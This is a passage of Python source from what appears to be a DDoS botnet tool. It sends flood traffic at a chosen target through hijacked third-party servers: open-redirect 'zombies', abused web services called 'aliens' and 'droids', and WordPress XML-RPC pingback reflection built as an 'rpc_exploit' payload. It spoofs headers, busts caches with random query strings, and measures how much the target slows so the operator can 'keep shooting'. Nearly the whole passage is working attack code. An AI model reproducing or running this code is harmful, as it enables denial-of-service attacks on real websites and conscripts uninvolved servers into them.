        # extract external status checkers, perform a request and check results
        time.sleep(5) # aiming (multi-threading flow time compensation)
        if not self.options.disablepurge:
            if not ucavs: # return when not any working
                self.options.disableucavs = True
                return
        options = self.options
        target = self.options.target
        shuffle(ucavs) # shuffle ucavs order, each round :-)
        if not self.options.disablepurge:
            for ucav in ucavs:
                if not ucav.startswith('http'): # discarded inmediately
                    self.discard_ucavs.append(ucav)
                    self.num_discard_ucavs = self.num_discard_ucavs + 1
                ucavs = self.discarding_ucavs(ucav, ucavs) # check if ucav is failing for autobalance army
        if not self.options.disablepurge:
            if not ucavs: # return when not any working
                self.options.disableucavs = True
                return
        shuffle(ucavs) # shuffle ucavs order, each discarding check :-)
        for ucav in ucavs:
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            if target.startswith("http://"): # parse target for some checkers
                target = target.replace('http://','')
            elif target.startswith("https://"):
                target = target.replace('https://','')
            url = ucav + target
            t = urlparse(ucav)
            name_ucav = t.netloc
            if name_ucav == "":
                name_ucav = ucav
            if options.verbose:
                print(("[Info] [UCAVs] Sniping: " + url))
            try:
                if options.proxy: # set proxy
                    self.proxy_transport(options.proxy)
                if options.timeout: # set timeout
                    ucav_timeout = options.timeout
                else:
                    ucav_timeout = 5 
                if ucav_timeout < 1:
                    ucav_timeout = 5 
                req = urllib.request.Request(url, None, headers)
                target_reply = urllib.request.urlopen(req, context=self.ctx, timeout=ucav_timeout).read().decode('utf-8')
                self.ucavs_hit = self.ucavs_hit + 1 # add ucav hit to stats
            except:
                print("[Info] [UCAVs] " + name_ucav + " -> FAILED (cannot connect!)")
                if not self.options.disablepurge:
                    self.discard_ucavs.append(ucav)
                    self.num_discard_ucavs = self.num_discard_ucavs + 1
                self.ucavs_fail = self.ucavs_fail + 1 # add ucav fail to stats
                target_reply = ""
            if target_reply == "": # check for target's status resolved by [UCAVs]
                pass
            else:
                if not "is down" or not "looks down" or not "No info found for host" in target_reply: # parse external service for reply
                    print("[Info] [UCAVs] " + name_ucav + " -> Target is ONLINE! -> [Keep shooting!]")
                    self.num_is_up = self.num_is_up + 1 
                else:
                    print("[Info] [UCAVs] " + name_ucav + " -> Target looks OFFLINE! -> [Checking!]")
                    self.num_is_down = self.num_is_down + 1
            if self.options.verbose:
                print("[Info] [AI] [UCAVs] "+str(name_ucav)+" is returning...")
        self.extra_zombies_lock = False # [ARMY] have finished

    def extract_median(self, num_list):
        # extract median from a list of numbers
        import statistics
        int_num = []
        for num in num_list:
            num = float(num)
            int_num.append(num)            
        return statistics.median(int_num)

    def check_is_loading(self, target):
        # perform a broadband test (using GET) to analize target's reply to the traffic generated each round
        self.start = None
        self.stop = None
        print('\n---------')
        print("\n[Info] [AI] Scanning target to check for levels on defensive shields...\n")
        if target.endswith(""):
            target.replace("", "/")
        self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
        headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
        try:
            req = urllib.request.Request(target, None, headers)
            if self.options.proxy: # set proxy
                self.proxy_transport(self.options.proxy)
            if self.options.timeout: # set timeout
                try:
                    timeout = int(self.options.timeout)
                except:
                    timeout = 5 
            else:
                timeout = 5 
            if timeout < 1:
                timeout = 5 
            self.start = time.time()
            target_reply = urllib.request.urlopen(req, context=self.ctx, timeout=timeout).read().decode('utf-8')
            header = urllib.request.urlopen(req, context=self.ctx).info()
            self.stop = time.time()
        except:
            print('[Info] [AI] Our scanner cannot connect to the target this round! -> [Skipping!]\n')
            return 
        try:
            s, size_name = self.convert_size(len(target_reply))
            self.loadcheck_size_list.append(s) # add record to size list
            size = '%s %s' % (s,size_name)
        except:
            size = "Error!"
        try:
            time_required = self.stop - self.start
            load = self.convert_time(time_required)
            self.loadcheck_load_list.append(load) # add record to load list
        except:
            load = "Error!"
        self.loadcheck_counter = self.loadcheck_counter + 1
        print(' -Total tests:', self.loadcheck_counter, "\n")
        if self.loadcheck_prev_size is not None and self.loadcheck_prev_load is not None:
            lsm = self.extract_median(self.loadcheck_size_list)
            if lsm is not None:
                self.loadcheck_size_median = str(lsm) + " " + size_name
            else:
                self.loadcheck_size_median = None
            llm = self.extract_median(self.loadcheck_load_list)
            if llm is not None:
                self.loadcheck_load_median = str(llm) + " seconds"
            else:
                self.loadcheck_load_median = None
            if self.loadcheck_counter == 2: # first round
                print('   -Bytes in (first round)    :', self.loadcheck_first_size)
                print('   -Bytes in (this round)     :', size)
                if self.loadcheck_size_median is not None:
                    print('   -Bytes in (median)         :', self.loadcheck_size_median)
                print(' ----')
                print('   -Load time (first round)   :', self.loadcheck_first_load, "seconds")
                print('   -Load time (this round)    :', load, "seconds")
                if self.loadcheck_load_median is not None:
                    print('   -Load time (median)        :', self.loadcheck_load_median, "\n")
                else:
                    print("\n")
                self.loadcheck_size_max = None
                self.loadcheck_size_min = None
                self.loadcheck_load_max = None
                self.loadcheck_load_min = None
            elif self.loadcheck_counter > 2: # rest of rounds
                lsmax = max(self.loadcheck_size_list)
                if lsmax is not None:
                    self.loadcheck_size_max = str(lsmax) + " " + size_name
                else:
                    self.loadcheck_size_max = None
                lsmin = min(self.loadcheck_size_list)
                if lsmin is not None:
                    self.loadcheck_size_min = str(lsmin) + " " + size_name
                else:
                    self.loadcheck_size_min = None
                llmax = max(self.loadcheck_load_list)
                if llmax is not None:
                    self.loadcheck_load_max = str(llmax) + " seconds"
                else:
                    self.loadcheck_load_max = None
                llmin = min(self.loadcheck_load_list)
                if llmin is not None:
                    self.loadcheck_load_min = str(llmin) + " seconds"
                else:
                    self.loadcheck_load_min = None
                print('   -Bytes in (first round)    :', self.loadcheck_first_size)
                print('   -Bytes in (previous round) :', self.loadcheck_prev_size)
                print('   -Bytes in (this round)     :', size)
                if self.loadcheck_size_max is not None:
                    print('   -Bytes in (max)            :', self.loadcheck_size_max)
                if self.loadcheck_size_min is not None:
                    print('   -Bytes in (min)            :', self.loadcheck_size_min)
                if self.loadcheck_size_median is not None:
                    print('   -Bytes in (median)         :', self.loadcheck_size_median)
                print(' ----')
                print('   -Load time (first round)   :', self.loadcheck_first_load, "seconds")
                print('   -Load time (previous round):', self.loadcheck_prev_load, "seconds")
                print('   -Load time (this round)    :', load, "seconds")
                if self.loadcheck_load_max is not None:
                    print('   -Load time (max)           :', self.loadcheck_load_max)
                if self.loadcheck_load_min is not None:
                    print('   -Load time (min)           :', self.loadcheck_load_min)
                if self.loadcheck_load_median is not None:
                    print('   -Load time (median)        :', self.loadcheck_load_median, "\n")
                else:
                    print("\n")
            if self.loadcheck_prev_load < load: # target is loading more slowly
                print("[Info] [AI] [Scanner] Target is serving the content more slowly this round! ;-) -> [Keep shooting!]\n")
            elif self.loadcheck_prev_load == load: # inmutable target
                print("[Info] [AI] [Scanner] Attack is not having any effect on your target this round... -> [Keep shooting!]\n")
            elif self.loadcheck_prev_load > load: # is target defending?
                print("[Info] [AI] [Scanner] Target is loading this round faster than the previous one! -> DETECTED: [PROXY CACHE!!]\n")
        else:
            print('   -Bytes in (this round) :', size)
            print('   -Load time (this round):', load, "seconds\n")
            self.loadcheck_first_size = size
            self.loadcheck_first_load = load
            self.loadcheck_size_median = None
            self.loadcheck_load_median = None
            self.loadcheck_size_max = None
            self.loadcheck_size_min = None
            self.loadcheck_load_max = None
            self.loadcheck_load_min = None
        self.loadcheck_prev_size = size # record previous size
        self.loadcheck_prev_load = load # record previous load

    def convert_size(self, size):
        if (size == 0):
            return '0 B'
        size_name = ("B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB")
        i = int(math.floor(math.log(size,1024)))
        p = math.pow(1024,i)
        s = round(size/p,2)
        return s, size_name[i]

    def convert_time(self, time):
        return '%.2f' % time

    def discarding_zombies(self, zombie, zombies):
        if zombie in self.discardzombies:
            zombies.remove(zombie)
            if self.options.verbose:
                print(("[Info] [AI] [Control] [Zombies] "+str(zombie)+" is not working! -> [Discarding!]"))
        return zombies

    def send_zombies(self, zombies):
        # send Open Redirect zombies
        time.sleep(1) # aiming (multi-threading flow time compensation)
        if not self.options.disablepurge:
            if not zombies:
                self.empty_zombies = True
                return
        if self.options.verbose:
            print("[Info] [AI] [Control] Deploying [Zombies] with 'maser-melee' weapons...")
        options = self.options
        target = self.options.target
        shuffle(zombies) # shuffle zombies order, each round :-)
        if not self.options.disablepurge:
            for zombie in zombies: # check if zombie is failing for autobalance army
                if not zombie.startswith('http'): # discarded inmediately
                    self.discardzombies.append(zombie)
                    self.num_discard_zombies = self.num_discard_zombies + 1
                zombies = self.discarding_zombies(zombie, zombies)
        if not self.options.disablepurge:
            if not zombies: # return when not any working
                self.empty_zombies = True
                return
        for zombie in zombies:
            t = urlparse(zombie)
            name_zombie = t.netloc
            if name_zombie == "":
                name_zombie = zombie
            if not self.options.attackme:
                print("[Info] [Zombies] Attacking from: " + name_zombie)
            else: # on attackme, target url is dynamic -> http://public_ip:port/hash|zombie
                self.mothership_hash = random.getrandbits(128) # generating random evasion hash  
                target = "http://" + str(self.pub_ip) + ":" + self.port + "/"+ str(self.mothership_hash) + "|" + zombie
                self.options.target = target
                print("[Info] [Zombies] Attacking: " + str(self.pub_ip) + ":" + self.port + " -> [LAN]" + self.local_ip + ":" + self.port)
                print("[Info] [Zombies] Payload: " + target)
                print('='*55, "\n")
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            if not options.target.startswith('http'):
                if options.forcessl:
                    options.target = "https://" + options.target
                else:
                    options.target = "http://" + options.target
            self.attack_mode = True
            try:
                if options.verbose:
                    print("[Info] [Zombies] Sniping: " + options.target)
                self.connect_zombies(zombie)
                if self.options.dbstress: # try to stress db on target by using vulnerable Open Redirect web servers
                    self.db_flash = self.db_flash + 1
                    stress = self.stressing(target, zombie)
            except Exception:
                print("[Info] [Zombies] " + zombie + " -> FAILED (cannot connect!)")
                self.total_zombies_failed_connection = self.total_zombies_failed_connection + 1 # used to manage threading pool
                if not self.options.disablepurge:
                    self.discardzombies.append(zombie)
                    self.num_discard_zombies = self.num_discard_zombies + 1
            if self.options.verbose:
                print("[Info] [AI] [Zombies] "+str(name_zombie)+" is returning...")
            self.attack_mode = False

    def discarding_aliens(self, alien, aliens):
        if alien in self.discard_aliens:
            aliens.remove(alien)
            if self.options.verbose:
                print(("[Info] [AI] [Control] [Aliens] "+str(alien)+" is not working! -> [Discarding!]"))
            self.aliens_fail = self.aliens_fail + 1 # add fail to aliens stats
        return aliens

    def send_aliens(self, aliens):
        # extract external web abuse services urls (POST) and perform requests against target
        time.sleep(2) # aiming (multi-threading flow time compensation)
        if not self.options.disablepurge:
            if not aliens: # return when not any working
                self.options.disablealiens = True
                return
        target = self.options.target
        options = self.options
        shuffle(aliens) # shuffle aliens 
        if not self.options.disablepurge:
            for alien in aliens:
                if not alien.startswith('http'): # discarded inmediately
                    self.discard_aliens.append(alien)
                    self.num_discard_aliens = self.num_discard_aliens + 1
                aliens = self.discarding_aliens(alien, aliens) # check if alien is failing for autobalance army
        if not self.options.disablepurge:
            if not aliens: # return when not any working
                self.options.disablealiens = True
                return
        shuffle(aliens) # shuffle aliens order, each discarding check :-)
        for alien in aliens:
            name_alien = None
            if "$POST" in alien: # extract alien/parameters -> search for $POST delimiter on 'aliens.txt' file
                regex_alien = re.compile('{}(.*){}'.format(re.escape(''), re.escape(';$POST'))) # regex magics
                pattern_alien = re.compile(regex_alien)
                alien_url = re.findall(pattern_alien, alien) # HTTP POST url for submit data
                regex_param = re.compile('{}(.*){}'.format(re.escape('$POST;'), re.escape(''))) # regex magics
                pattern_param = re.compile(regex_param)
                param = re.findall(pattern_param, alien) # HTTP POST params to submit
                for u in alien_url:
                    url = u # ex: POST -> path/submit.php
                t = urlparse(url)
                name_alien = t.netloc
                if name_alien == "":
                    name_alien = alien
                print("[Info] [Aliens] Attacking from: " + name_alien)
                for p in param:
                    param_target = {p : target} # ex POST -> url=target
                    param_target = urllib.parse.urlencode(param_target)
                try:
                    if options.verbose:
                        print("[Info] [Aliens] Sniping: " + url + " - POST:", param_target)
                    if options.proxy: # set proxy
                        self.proxy_transport(options.proxy)
                    if self.options.timeout: # set timeout
                        try:
                            alien_timeout = int(self.options.timeout)
                        except:
                            alien_timeout = 5 
                    else:
                        alien_timeout = 5 
                    if alien_timeout < 1:
                        alien_timeout = 5 
                    req = urllib.request.Request(url, param_target.encode('utf-8'))
                    rsp = urllib.request.urlopen(req, context=self.ctx, timeout=alien_timeout)
                    self.aliens_hit = self.aliens_hit + 1 # add hit to aliens stats
                except Exception:
                    print("[Info] [Aliens] " + name_alien + " -> FAILED (cannot connect!)")
                    self.aliens_fail = self.aliens_fail + 1 # add fail to aliens stats
                    if not self.options.disablepurge:
                        self.discard_aliens.append(alien)
                        self.num_discard_aliens = self.num_discard_aliens + 1
            else:
                print(("[Info] [Aliens] "+str(alien)+" -> FAILED (invalid alien!)"))
                self.aliens_fail = self.aliens_fail + 1 # add fail to aliens stats
                if not self.options.disablepurge:
                    self.discard_aliens.append(alien)
                    self.num_discard_aliens = self.num_discard_aliens + 1
            if self.options.verbose:
                if name_alien:
                    print("[Info] [AI] [Aliens] "+str(name_alien)+" is returning...")
                else:
                    print("[Info] [AI] [Aliens] "+str(alien)+" is returning...")

        if self.options.disabledroids and self.options.disablerpcs and self.options.disableucavs:
            self.extra_zombies_lock = False # [ARMY] have finished

    def extract_aliens(self):
        # extract aliens from file
        options = self.options
        try:
            f = open(self.aliens_file)
            aliens = f.readlines()
            aliens = [ alien.replace('\n','') for alien in aliens ]
            f.close()
            if not aliens:
                print("[Info] [AI] [Control] Cannot retrieve [Aliens] from: 'botnet/aliens.txt' -> [Discarding!]")
                self.options.disablealiens = True
                return
            else:
                return aliens
        except:
            if os.path.exists(self.aliens_file) == True:
                print("[Info] [AI] [Control] Cannot open [Aliens] from: 'botnet/aliens.txt' -> [Discarding!]")
                return #sys.exit(2)
            else:
                print("[Info] [AI] [Control] Cannot found [Aliens] from: 'botnet/aliens.txt' -> [Discarding!]")
                return #sys.exit(2)

    def discarding_droids(self, droid, droids):
        if droid in self.discard_droids:
            droids.remove(droid)
            if self.options.verbose:
                print(("[Info] [AI] [Control] [Droids] "+str(droid)+" is not working! -> [Discarding!]"))
            self.droids_fail = self.droids_fail + 1 # add fail to droids stats
        return droids

    def send_droids(self, droids):
        # extract external web abuse services urls (GET) and perform requests against target
        time.sleep(3) # aiming (multi-threading flow time compensation)
        if not self.options.disablepurge:
            if not droids: # return when not any working
                self.options.disabledroids = True
                return
        target = self.options.target
        try:
            target = urllib.parse.unquote(target).decode('utf8') # parte urlencoding
        except:
            target = urllib.parse.unquote(target)
        if target.startswith('http://'): # remove http
            target = target.replace('http://', '')
        if target.startswith('https://'):
            target = target.replace('https://', '') # remove https
        options = self.options
        shuffle(droids) # shuffle droids
        if not self.options.disablepurge:
            for droid in droids:
                if not droid.startswith('http'): # discarded inmediately
                    self.discard_droids.append(droid)
                    self.num_discard_droids = self.num_discard_droids + 1
                droids = self.discarding_droids(droid, droids) # check if droid is failing for autobalance army
        if not self.options.disablepurge:
            if not droids: # return when not any working
                self.options.disabledroids = True
                return
        shuffle(droids) # shuffle droids order, each discarding check :-)
        for droid in droids:
            name_droid = None
            if "$TARGET" in droid: # replace droid/parameter for target
                url = droid.replace("$TARGET", target)
                t = urlparse(url)
                name_droid = t.netloc
                if name_droid == "":
                    name_droid = droid
                print("[Info] [Droids] Attacking from: " + name_droid)
                self.user_agent = random.choice(self.agents).strip() # shuffle user-agent 
                headers = {'User-Agent' : self.user_agent, 'Content-type' : "application/x-www-form-urlencoded", 'Referer' : self.referer, 'Connection' : 'keep-alive'} # set fake headers
                try:
                    if options.proxy: # set proxy
                        self.proxy_transport(options.proxy)
                    if self.options.timeout: # set timeout
                        try:
                            droid_timeout = int(self.options.timeout)
                        except:
                            droid_timeout = 5
                    else:
                        droid_timeout = 5
                    if droid_timeout < 1:
                        droid_timeout = 5 
                    req = urllib.request.Request(url, None, headers)
                    rsp = urllib.request.urlopen(req, context=self.ctx, timeout=droid_timeout)
                    self.droids_hit = self.droids_hit + 1 # add hit to droids stats
                except Exception:
                    print("[Info] [Droids] " + name_droid + " -> FAILED (cannot connect!)")
                    self.droids_fail = self.droids_fail + 1 # add fail to droids stats
                    if not self.options.disablepurge:
                        self.discard_droids.append(droid)
                        self.num_discard_droids = self.num_discard_droids + 1
            else:
                print("[Info] [Droids] " + str(droid) + " -> FAILED (invalid droid!)")
                self.droids_fail = self.droids_fail + 1 # add fail to droids stats
                if not self.options.disablepurge:
                    self.discard_droids.append(droid)
                    self.num_discard_droids = self.num_discard_droids + 1
            if self.options.verbose:
                if name_droid:
                    print("[Info] [AI] [Droids] "+str(name_droid)+" is returning...")
                else:
                    print("[Info] [AI] [Droids] "+str(droid)+" is returning...")

        if self.options.disablerpcs and self.options.disableucavs:
            self.extra_zombies_lock = False # [ARMY] have finished

    def extract_droids(self):
        # extract droids from file
        options = self.options
        try:
            f = open(self.droids_file)
            droids = f.readlines()
            droids = [ droid.replace('\n','') for droid in droids ]
            f.close()
            if not droids:
                print("[Info] [AI] [Control] Cannot retrieve [Droids] from: 'botnet/droids.txt' -> [Discarding!]")
                self.options.disabledroids = True
                return
            else:
                return droids
        except:
            if os.path.exists(self.droids_file) == True:
                print("[Info] [AI] [Control] Cannot open [Droids] from: 'botnet/droids.txt' -> [Discarding!]")
                return #sys.exit(2)
            else:
                print("[Info] [AI] [Control] Cannot found [Droids] from: 'botnet/droids.txt' -> [Discarding!]")
                return #sys.exit(2)

    def discarding_rpcs(self, rpc, rpcs):
        if rpc in self.discard_rpcs:
            rpcs.remove(rpc)
            if self.options.verbose:
                print(("[Info] [AI] [Control] [X-RPCs] "+str(rpc)+" is not working! -> [Discarding!]"))
        return rpcs

    def send_rpcs(self, rpcs):
        # extract vulnerable XML-RPC pingback services and perform requests against target
        time.sleep(4) # aiming (multi-threading flow time compensation)
        if not self.options.disablepurge:
            if not rpcs: # return when not any working
                self.options.disablerpcs = True
                return
        target = self.options.target
        options = self.options
        def random_key(length):
            key = ''
            for i in range(length):
                key += random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits)
            return key
        shuffle(rpcs) # shuffle rpcs
        if not self.options.disablepurge:
            for rpc in rpcs:
                if not rpc.startswith('http'): # discarded inmediately
                    if not self.options.disablepurge:
                        self.discard_rpcs.append(rpc)
                        self.num_discard_rpcs = self.num_discard_rpcs + 1
                    self.rpcs_fail = self.rpcs_fail + 1 # add rpc fail to stats
                rpcs = self.discarding_rpcs(rpc, rpcs) # check if rpc is failing for autobalance army
        if not self.options.disablepurge:
            if not rpcs: # return when not any working
                self.options.disablerpcs = True
                return
        shuffle(rpcs) # shuffle rpcs order, each discarding check :-)
        for rpc in rpcs:
            t = urlparse(rpc)
            name_rpc = t.netloc
            if name_rpc == "":
                name_rpc = rpc
            print("[Info] [X-RPCs] Attacking from: " + name_rpc)
            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
            headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
            key = random_key(8) # generate random value page to bypass cache
            rpc_page = "?" + str(key)
            key = random_key(6) # re-generate random value id to bypass cache
            rpc_id = "=" + str(key)
            target_place = target + rpc_page + rpc_id # random place to bypass cache (ex: www.target.com?U7OvBdp1=4lMcNj)
            if "/xmlrpc.php" in rpc:
                rpc_place = rpc.replace("xmlrpc.php", "")
                rpc_exploit = "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>"+target_place+"</string></value></param><param><value><string>"+rpc_place+"</string></value></param></params></methodCall>"
                try:
                    if options.proxy: # set proxy
                        self.proxy_transport(options.proxy)
                    if self.options.timeout: # set timeout
                        try:
                            rpc_timeout = int(self.options.timeout)
                        except:
                            rpc_timeout = 5 
                    else:
                        rpc_timeout = 5 
                    if rpc_timeout < 1:
                        rpc_timeout = 5 
                    req = urllib.request.Request(rpc, rpc_exploit.encode('utf-8'), headers)
                    urllib.request.urlopen(req, context=self.ctx, timeout=rpc_timeout)
                    self.rpcs_hit = self.rpcs_hit + 1 # add rpc hit to stats
                    if self.options.verbose:
                        print("[Info] [X-RPCs] Reply:", target_reply)
                except:
                    print("[Info] [X-RPCs] " + name_rpc + " -> FAILED (cannot connect!)")
                    self.rpcs_fail = self.rpcs_fail + 1 # add rpc fail to stats
                    if not self.options.disablepurge:
                        self.discard_rpcs.append(rpc)
                        self.num_discard_rpcs = self.num_discard_rpcs + 1
            else:
                print("[Info] [X-RPCs] " + name_rpc + " -> FAILED (invalid X-RPC!)")
                self.rpcs_fail = self.rpcs_fail + 1 # add rpc fail to stats
                if not self.options.disablepurge:
                    self.discard_rpcs.append(rpc)
                    self.num_discard_rpcs = self.num_discard_rpcs + 1
            if self.options.verbose:
                print("[Info] [AI] [X-RPCs] "+str(name_rpc)+" is returning...")
        if self.options.disableucavs:
            self.extra_zombies_lock = False # [ARMY] have finished

    def extract_rpcs(self):
        # extract rpcs from file
        options = self.options
        try:
            f = open(self.rpcs_file)
            rpcs = f.readlines()
            rpcs = [ rpc.replace('\r','') for rpc in rpcs ]
            rpcs = [ rpc.replace('\n','') for rpc in rpcs ]
            f.close()
            if not rpcs:
                print("[Info] [AI] [Control] Cannot retrieve [X-RPCs] from: 'botnet/rpcs.txt' -> [Discarding!]")
                self.options.disablerpcs = True
                return
            else:
                return rpcs
        except:
            if os.path.exists(self.rpcs_file) == True:
                print("[Info] [AI] [Control] Cannot open [X-RPCs] from: 'botnet/rpcs.txt' -> [Discarding!]")
                return
            else:
                print("[Info] [AI] [Control] Cannot found [X-RPCs] from: 'botnet/rpcs.txt' [Discarding!]")
                return

    def extract_ntps(self):
        # extract ntps from file
        options = self.options
        try:
            f = open(self.ntps_file)
            ntps = f.readlines()
            ntps = [ ntp.replace('\r','') for ntp in ntps ]
            ntps = [ ntp.replace('\n','') for ntp in ntps ]
            f.close()
            if not ntps:
                print("[Info] [AI] [Control] Cannot retrieve [NTPs] from: 'botnet/ntp.txt' -> [Discarding!]")
                return
            else:
                return ntps
        except:
            if os.path.exists(self.ntps_file) == True:
                print("[Info] [AI] [Control] Cannot open [NTPs] from: 'botnet/ntp.txt' -> [Discarding!]")
                return
            else:
                print("[Info] [AI] [Control] Cannot found [NTPs] from: 'botnet/ntp.txt' [Discarding!]")
                return

    def extract_dnss(self):
        # extract dnss from file
        options = self.options
        try:
            f = open(self.dnss_file)
            dnss = f.readlines()
            dnss = [ dns.replace('\r','') for dns in dnss ]
            dnss = [ dns.replace('\n','') for dns in dnss ]
            f.close()
            if not dnss:
                print("[Info] [AI] [Control] Cannot retrieve [DNSs] from: 'botnet/dns.txt' -> [Discarding!]")
                return
            else:
                return dnss
        except:
            if os.path.exists(self.dnss_file) == True:
                print("[Info] [AI] [Control] Cannot open [DNSs] from: 'botnet/dns.txt' -> [Discarding!]")
                return
            else:
                print("[Info] [AI] [Control] Cannot found [DNSs] from: 'botnet/dns.txt' [Discarding!]")
                return

    def extract_snmps(self):
        # extract snmps from file
        options = self.options
        try:
            f = open(self.snmps_file)
            snmps = f.readlines()
            snmps = [ snmp.replace('\r','') for snmp in snmps ]
            snmps = [ snmp.replace('\n','') for snmp in snmps ]
            f.close()
            if not snmps:
                print("[Info] [AI] [Control] Cannot retrieve [SNMPs] from: 'botnet/snmp.txt' -> [Discarding!]")
                return
            else:
                return snmps
        except:
            if os.path.exists(self.snmps_file) == True:
                print("[Info] [AI] [Control] Cannot open [SNMPs] from: 'botnet/snmp.txt' -> [Discarding!]")
                return
            else:
                print("[Info] [AI] [Control] Cannot found [SNMPs] from: 'botnet/snmp.txt' [Discarding!]")
                return

    def extract_zombies(self):
        options = self.options
        if self.options.test:
            try:
                f = open(options.test)
                zombies = f.readlines()
                zombies = [ zombie.replace('\n','') for zombie in zombies ]
                f.close()
                if not zombies:
                    print("\n[Error] [AI] [Control] Cannot retrieve [Zombies] from: 'botnet/zombies.txt' -> [Aborting!]\n")
                    return
                else:
                    return zombies
            except:
                if os.path.exists(options.test) == True:
                    print("\n[Error [AI] [Control] Cannot open [Zombies] from: 'botnet/zombies.txt' -> [Aborting!]\n")
                    return #sys.exit(2)
                else:
                    print("\n[Error] [AI] [Control] Cannot found [Zombies] from: 'botnet/zombies.txt' -> [Aborting!]\n")
                    return #sys.exit(2)
        else:
            try:
                f = open(self.zombies_file)
                zombies = f.readlines()
                zombies = [ zombie.replace('\n','') for zombie in zombies ]
                f.close()
                if not zombies:
                    print("\n[Error] [AI] You haven't [Zombies] to be extracted from: 'botnet/zombies.txt' -> [Aborting!]\n")
                    return
                else:
                    return zombies
            except:
                if os.path.exists(self.zombies_file) == True:
                    print("\n[Error] [AI] [Control] Cannot open [Zombies] from: 'botnet/zombies.txt' -> [Aborting!]\n")
                    return #sys.exit(2)
                else:
                    print("\n[Error] [AI] [Control] Cannot found [Zombies] from: 'botnet/zombies.txt' -> [Aborting!]\n")
                    return #sys.exit(2)

    def extract_target_list(self):
        options = self.options
        try:
            f = open(options.target_list)
            targets = f.readlines()
            targets = [ target.replace('\n','') for target in targets ]
            f.close()
            if not targets:
                print("\n[Error] [AI] [Control] Cannot retrieve [Targets] from: '"+options.target_list+"' -> [Aborting!]\n")
                return
            else:
                return targets
        except:
            if os.path.exists(options.target_list) == True:
                print("\n[Error] [AI] [Control] Cannot found [Targets] from: '"+options.target_list+"' -> [Aborting!]\n")
                return #sys.exit(2)
            else:
                print("\n[Error] [AI] [Control] Cannot open [Targets] from: '"+options.target_list+"' -> [Aborting!]\n")
                return #sys.exit(2)

    def update_zombies(self, zombies_ready):
        # update zombies on file
        options = self.options
        if options.attackme:
            f = open(self.zombies_file, "w") # re-write list
            for zombie in self.doll.real_zombies: # add only alien verified zombies
                for x in zombie:
                    f.write(str(x) + os.linesep)
            f.close()
        if options.test or options.testall:
            if not options.test:
                options.test = self.zombies_file
            f = open(options.test, "w") # re-write list only with zombies ready
            for zombie in zombies_ready:
                f.write(zombie + os.linesep)
            f.close()
        if options.search or options.dorks or options.autosearch or options.download or options.download_github: # append only new zombies to list (dorking supported)
            f = open(self.zombies_file)
            zombies_on_file = f.read().splitlines()
            with open(self.zombies_file, "a") as zombie_list: 
                for zombie in zombies_ready:
                    if zombie not in zombies_on_file: # parse possible repetitions
                        zombie_list.write(zombie + os.linesep)
                        if options.download or options.download_github:
                            self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
                        else:
                            self.scanned_zombies = self.scanned_zombies + 1 # update scanner stats only with new zombies (dorking)
            f.close()

    def update_aliens(self, aliens_ready):
        # update aliens on file
        options = self.options
        if options.download or options.download_github: # append only new aliens to list
            f = open(self.aliens_file)
            aliens_on_file = f.read().splitlines()
            with open(self.aliens_file, "a") as alien_list:
                for alien in aliens_ready:
                    if alien not in aliens_on_file: # parse possible repetitions
                        alien_list.write(alien + os.linesep)
                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def update_droids(self, droids_ready):
        # update droids on file
        options = self.options
        if options.download or options.download_github: # append only new droids to list
            f = open(self.droids_file)
            droids_on_file = f.read().splitlines()
            with open(self.droids_file, "a") as droid_list:
                for droid in droids_ready:
                    if droid not in droids_on_file: # parse possible repetitions
                        droid_list.write(droid + os.linesep)
                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def update_ucavs(self, ucavs_ready):
        # update ucavs on file
        options = self.options
        if options.download or options.download_github: # append only new ucavs to list
            f = open(self.ucavs_file)
            ucavs_on_file = f.read().splitlines()
            with open(self.ucavs_file, "a") as ucav_list:
                for ucav in ucavs_ready:
                    if ucav not in ucavs_on_file: # parse possible repetitions
                        ucav_list.write(ucav + os.linesep)
                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def update_rpcs(self, rpcs_ready):
        # update rpcs on file
        options = self.options
        if options.testrpc or options.testall:
            f = open(self.rpcs_file, "w") # re-write list
            for rpc in rpcs_ready: # add only rpc verified zombies
                f.write(rpc + os.linesep)
            f.close()
        if options.download or options.download_github: # append only new rpcs to list
            f = open(self.rpcs_file)
            rpcs_on_file = f.read().splitlines()
            with open(self.rpcs_file, "a") as rpc_list:
                for rpc in rpcs_ready:
                    if rpc not in rpcs_on_file: # parse possible repetitions
                        rpc_list.write(rpc + os.linesep)
                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def update_dnss(self, dnss_ready):
        # update dns on file
        options = self.options
        if options.download or options.download_github: # append only new dns to list
            f = open(self.dnss_file)
            dnss_on_file = f.read().splitlines()
            with open(self.dnss_file, "a") as dns_list:
                for dns in dnss_ready:
                    if dns not in dnss_on_file: # parse possible repetitions
                        dns_list.write(dns + os.linesep)
                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def update_ntps(self, ntps_ready):
        # update ntps on file
        options = self.options
        if options.download or options.download_github: # append only new ntps to list
            f = open(self.ntps_file)
            ntps_on_file = f.read().splitlines()
            with open(self.ntps_file, "a") as ntp_list:
                for ntp in ntps_ready:
                    if ntp not in ntps_on_file: # parse possible repetitions
                        ntp_list.write(ntp + os.linesep)
                        self.trans_zombies = self.trans_zombies + 1 # update trans stats only with new zombies (blackhole)
            f.close()

    def update_snmps(self, snmps_ready):
        # update snmps on file
        options = self.options
        if options.download or options.download_github: # append only new snmps to list
            f = open(self.snmps_file)
            snmps_on_file = f.read().splitlines()
            with open(self.snmps_file, "a") as snmp_list:
                for snmp in snmps_ready:
                    if snmp not in snmps_on_file: # parse possible repetitions
                        snmp_list.write(snmp + os.linesep)
